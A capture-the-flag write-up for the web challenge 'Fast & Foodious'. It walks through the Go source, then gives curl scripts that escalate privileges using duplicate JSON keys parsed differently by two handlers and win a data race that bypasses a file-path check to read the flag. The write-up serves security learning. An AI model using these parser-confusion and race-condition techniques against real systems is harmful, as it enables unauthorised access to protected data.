---
layout: post
title: AITU CTF 2026 Quals - Fast & Foodious (Web)
date: 2026-03-24
description: Privilege escalation and skip of a security test
tags: writeups web go jwt aituctf
categories: writeups web
author: "Guillaume"
---

## Challenge Overview

- **Name of the CTF Event:** AITU CTF 2026 Quals
- **Challenge Name:** Fast & Foodious
- **Category:** Web
- **Description:** I am so excited that new food delivery service is already in our City!!! Unfortunately some sellers provide their products only to "special" people.
- **Provided Files / URL:** `FastFoodious.zip`, `http://fast-and-foodious.ctf.fr13nds.team`
- **Goal:** Find the flag.

## Initial Analysis

I started by opening the zip file and by running the docker inside of it. This allowed me to see that they gave me a
full copy of the website, so I have all the files I need, especially the backend. I noticed a file name `flag.txt`, with
of course not the real flag inside, so I decided to look where this file was called using

```bash
grep -r flag.txt
```

Beside from the Dockerfile, it is only referenced once in a file named `main.go` containing all the backend logic. The whole element is :

```go
a.products["vault-special"] = product{
		SKU:       "vault-special",
		Name:      "Chef Vault Special",
		Owner:     "🍕 Mr Pizza",
		OwnerDesc: "~ The hidden chef special vault.",
		Price:     95000,
		AssetPath: "/home/ctf/flag.txt",
		Limited:   true,
	}
```

What is interesting is the `Limited:   true` which is different from the other products but most importantly we now know that the file containing the flag is the value of an `AssetPath` field.
A quick search shows that this field is only used in a single function named `handleCheckoutSKU`, notably in the following call :

```go
item, err := a.readProductAsset(p.AssetPath)
```

A brief analysis on how to call this function led me to the following code :

```go
mux.HandleFunc("/register", methodHint(http.MethodPost, map[string]string{"username": "string", "password": "string"}, a.handleRegister))
mux.HandleFunc("/login", methodHint(http.MethodPost, map[string]string{"username": "string", "password": "string"}, a.handleLogin))

mux.HandleFunc("/profile", func(w http.ResponseWriter, r *http.Request) {
  if r.Method == http.MethodGet {
    a.handleProfileGet(w, r)
  } else if r.Method == http.MethodPost {
    a.handleProfilePost(w, r)
  } else {
    writeJSON(w, http.StatusMethodNotAllowed, map[string]any{
      "error": "Invalid method. Please use GET to view profile or POST to update.",
      "expected_parameters_for_post": map[string]string{"blob": "JSON object"},
    })
  }
})

mux.HandleFunc("/catalog", methodHint(http.MethodGet, nil, a.handleCatalog))
mux.HandleFunc("/checkout", methodHint(http.MethodGet, nil, a.handleCheckoutIndex))

mux.HandleFunc("/checkout/vault", methodHint(http.MethodPost, nil, func(w http.ResponseWriter, r *http.Request) {
  a.handleCheckoutSKU(w, r, "vault-special", &checkoutErr)
}))

mux.HandleFunc("/checkout/{sku}", methodHint(http.MethodPost, nil, func(w http.ResponseWriter, r *http.Request) {
  sku := r.PathValue("sku")
  a.handleCheckoutSKU(w, r, sku, &checkoutErr)
}))
```

showing the different functions being callable through the website API. Here the one that I am looking for will be
callable at `/checkout/vault` or `/checkout/vault-special`

# Solution Path

## Step 1: Getting a session token

To reach the call to `readProductAsset`, we first need to pass this code section :

```go
sid, ok := a.getSessionID(r)
if !ok {
  http.Error(w, "unauthorized", http.StatusUnauthorized)
  return
}

s, ok := a.getSession(sid)
if !ok {
  http.Error(w, "unauthorized", http.StatusUnauthorized)
  return
}
```

The way to get a session is rather straightforward : we just need to register a new user and then login with the
credentials of that user.

As we can see with the API, they are just POST requests to `http://fast-and-foodious.ctf.fr13nds.team/register`
or `http://fast-and-foodious.ctf.fr13nds.team/login` with a JSON containing a username and a password.
We can now register ourselves by doing :

```bash
curl -s -X POST -d "{\"username\":\"test\",\"password\":\"test\"}" http://fast-and-foodious.ctf.fr13nds.team/register
```

And we can login with

```bash
curl -s -X POST -d "{\"username\":\"test\",\"password\":\"test\"}" http://fast-and-foodious.ctf.fr13nds.team/login
```

with, for example, the following output :

```json
{
  "jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzQzNzcxMzEsImlhdCI6MTc3NDM0ODMzMSwicm9sZSI6Im9wc19sZWFkIiwic2lkIjoiMGUxNzA2ZDhhZjVlYTE0ZDA3NWUxNzhlMTFkZjYzNmI0ZjVhMTI0ZGIzZThjMzA5Iiwic3ViIjoiQSIsInR5cCI6InNlc3Npb24ifQ.u_Rr3p6uC5IaDJ2HJWpAEPW9f_jT3ACzHojF6pWRgJo",
  "role": "ops_lead",
  "session_token": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzQzNzcxMzEsImlhdCI6MTc3NDM0ODMzMSwicm9sZSI6Im9wc19sZWFkIiwic2lkIjoiMGUxNzA2ZDhhZjVlYTE0ZDA3NWUxNzhlMTFkZjYzNmI0ZjVhMTI0ZGIzZThjMzA5Iiwic3ViIjoiQSIsInR5cCI6InNlc3Npb24ifQ.u_Rr3p6uC5IaDJ2HJWpAEPW9f_jT3ACzHojF6pWRgJo",
  "status": "logged_in"
}
```

To put the JWT in a variable to reuse it later we can do :

```bash
JWT=$(curl -s -X POST -d "{\"username\":\"test\",\"password\":\"test\"}" http://fast-and-foodious.ctf.fr13nds.team/login | jq -r '.jwt')
```

By looking at `getSessionId` we can see that this JWT is passed as a cookie :

```go
c, err := r.Cookie("session")
```

## Step 2: Bypass the restrictions of limited products

The next test is to verify whether the product that we provided is legit, which it is so no problem here.
The real difficulty starts right after with the following test :

```go
if p.Limited {
		if !s.CanOrderVault || time.Now().UnixMilli() > s.VaultUntilUnix {
			http.Error(w, "denied", http.StatusForbidden)
			return
		}
	}
```

With `s` being a variable of type `session` defined as :

```go
type session struct {
	Username       string
	Role           string
	ProfileJWT     string
	CanSeeVault    bool
	CanOrderVault  bool
	VaultUntilUnix int64
}
```

However only one function can create a `session` and only two can modify it.
Our first problem is that `handleLogin`, the function creating a `session`, does not initialize all fields and only does :

```go
assignedRole := getRandomRole()
a.sessions[sid] = session{Username: u.Username, Role: assignedRole}
```

The `Username` being the one that the user choose and the `assignedRole` being randomly chosen between `"support_admin"`, `"ops_lead"`, `"finance_reviewer"` and `"menu_auditor"`.

The problem is that neither the fields `CanOrderVault` nor `VaultUntilUnix` are manually initialized so they default to `0` making us fail the previous test.

The most promising function to fix that issue seems to be `handleCatalog` because it can set `CanOrderVault` and `VaultUntilUnix` to the values that we need :

```go
claims, err := a.parseProfileJWT(s.ProfileJWT)
...
blob, _ := claims["blob"].(string)
access := gjson.Get(blob, "access").String()
pointer := gjson.Get(blob, "pointer").String()
...
view := gjson.Get(liveCatalogDoc, pointer)
...
vaultReady := view.String() == "Vault lane green"
canSee := access == "staff" && vaultReady
...
a.sessionsMu.Lock()
ss := a.sessions[sid]
ss.CanSeeVault = canSee
ss.CanOrderVault = canSee
if canSee {
  ss.VaultUntilUnix = time.Now().Add(a.menuTTL).UnixMilli()
  ss.ProfileJWT = a.refreshProfileJWTNoErr(sid, blob)
}
a.sessions[sid] = ss
a.sessionsMu.Unlock()
```

with :

```go
const liveCatalogDoc = `{
	"feed": {
		"today": "service open"
	},
	"internal": {
		"kitchen.mode*alpha": "Vault lane green"
	}
}`
```

So we just need to find a way to conveniently set the fields `access` and `pointer` of the `ProfileJWT` field of our session.
To do so we need to use the `handleProfilePost` function because of the following instructions :

```go
jwtStr, err := a.signProfileJWT(sid, string(env.Blob))
...
s.ProfileJWT = jwtStr
```

with `env` being a `ProfileRequest` containing `strict` a `ProfileUpdate` using these datastructures :

```go
type ProfileRequest struct {
	Blob json.RawMessage `json:"blob"`
}

type ProfileUpdate struct {
	Access  string `json:"access"`
	Pointer string `json:"pointer"`
	City    string `json:"city"`
}
```

Since here `env` is just the request body we can put arbitrary data in it. However, some tests are here to block us from getting more rights than we should, notably :

```go
if strict.Access != "guest" {
		http.Error(w, "invalid profile", http.StatusBadRequest)
		return
	}
	if !strings.HasPrefix(strict.Pointer, "feed.") {
		http.Error(w, "invalid profile", http.StatusBadRequest)
		return
	}
```

Here we have two contradictions : we need the `access` field to be `staff` but it can only be `guest` and
the `pointer` field should be `internal.kitchen.mode*alpha` (or `internal.*` since there is only one field in `internal`)
but it can only start with `feed.`.

But since the way that the JSON fields are retrieved in `handleCatalog` and `handleProfilePost` is different
I thought that maybe they default to a different field if there is a duplicate, so I tried :

```bash
curl -s -X POST -d '{"blob":{"access":"staff","access":"guest","pointer":"internal.*","pointer":"feed.today","city":"Zurich"}}' --cookie "session=Bearer.$JWT" http://fast-and-foodious.ctf.fr13nds.team/profile
```

and that call was a success so `handleProfilePost` looks at the last field. But now if we try to call `handleCatalog` with this command :

```bash
curl -s -X GET --cookie "session=Bearer.$JWT" http://fast-and-foodious.ctf.fr13nds.team/catalog
```

we get :

```JSON
{"pointer_value":"Vault lane green","products":[{"sku":"classic-doner","name":"🌯 Classic Döner","owner":"🌯 Donerbek","owner_desc":"~ He doesn't talk. He grills.","price":2000,"limited":false},{"sku":"doner-xxl","name":"💀 Döner XXL Boss Edition","owner":"🌯 Donerbek","owner_desc":"~ He doesn't talk. He grills.","price":5999,"limited":false},{"sku":"pepperoni","name":"🌶️ Pepperoni Supreme (67cm)","owner":"🍕 Mr Pizza","owner_desc":"~ (ex-Mr Penis, retired cat meme, now serious businessman)","price":11290,"limited":false},{"sku":"sazan-burger","name":"🐟 Grilled Sazan Burger","owner":"🐟 SF (Sazan Food)","owner_desc":"~ From balkhash to franchise.","price":3337,"limited":false},{"sku":"fish-kebab","name":"🍢 Double Fish Kebab","owner":"🐟 SF (Sazan Food)","owner_desc":"~ From balkhash to franchise.","price":5000,"limited":false},{"sku":"vault-special","name":"Chef Vault Special","owner":"🍕 Mr Pizza","owner_desc":"~ The hidden chef special vault.","price":95000,"limited":true}]}
```

which does contain `"pointer_value":"Vault lane green"` so `handleCatalog` looks at the first field, which means that now we can pass the test in `handleCheckoutSKU`.

## Step 3: Exploiting a data race

However, there is a final issue :

```go
if sharedErr != nil {
  *sharedErr = enforceAssetPolicy(p.AssetPath)
  a.processIntent(s.Username, p.SKU)
  if *sharedErr != nil {
    http.Error(w, "denied : " + (*sharedErr).Error(), http.StatusForbidden)
    return
  }
} else {
  if err := enforceAssetPolicy(p.AssetPath); err != nil {
    http.Error(w, "denied", http.StatusForbidden)
    return
  }
}
```

our `AssetPath` (`/home/ctf/flag`) gets verified by `enforceAssetPolicy` which will always return an error because of the following code :

```go
if strings.HasPrefix(clean, "/home/ctf/") {
  return errors.New("protected")
}
```

However, we can see that between the call to `enforceAssetPolicy` and the check of `*sharedErr != nil`, there is
a call to `processIntent`, which does nothing but wait a random amount of time. Using the fact that `sharedErr` is
a global variable, we can set up a race condition where the value of `*sharedErr` is modified to `nil` by another
rightful API call when our call to get the flag is still executing `processIntent`, allowing us to retrieve the flag.

# Exploit

First we need to register a user, only one will be necessary here:

```bash
curl -s -X POST -d "{\"username\":\"test\",\"password\":\"test\"}" http://fast-and-foodious.ctf.fr13nds.team/register
```

Then we will use two bash scripts, one to retrieve the flag and another to cause the data race:

```bash
JWT=$(curl -s -X POST -d "{\"username\":\"test\",\"password\":\"test\"}" http://fast-and-foodious.ctf.fr13nds.team/login | jq -r '.jwt')

curl -s -X POST -d '{"blob":{"access":"staff","access":"guest","pointer":"internal.*","pointer":"feed.today","city":"Zurich"}}' --cookie "session=Bearer.$JWT" http://fast-and-foodious.ctf.fr13nds.team/profile > /dev/null

curl -s -X GET --cookie "session=Bearer.$JWT" http://fast-and-foodious.ctf.fr13nds.team/catalog > /dev/null

curl -s -X POST --cookie "session=Bearer.$JWT" http://fast-and-foodious.ctf.fr13nds.team/checkout/vault | grep checkout_complete
```

```bash
while true
do
JWT=$(curl -s -X POST -d "{\"username\":\"test\",\"password\":\"test\"}" http://fast-and-foodious.ctf.fr13nds.team/login | jq -r '.jwt')

curl -s -X POST -d '{"blob":{"access":"staff","access":"guest","pointer":"internal.*","pointer":"feed.today","city":"Zurich"}}' --cookie "session=Bearer.$JWT" http://fast-and-foodious.ctf.fr13nds.team/profile > /dev/null

curl -s -X GET --cookie "session=Bearer.$JWT" http://fast-and-foodious.ctf.fr13nds.team/catalog > /dev/null

curl -s -X POST --cookie "session=Bearer.$JWT" http://fast-and-foodious.ctf.fr13nds.team/checkout/pepperoni > /dev/null
done
```

Finally, we run the second script, and we launch the first one manually a few times before getting a
data race causing the flag to appear:

```JSON
{"receipt":"flag{...}","sku":"vault-special","status":"checkout_complete"}
```
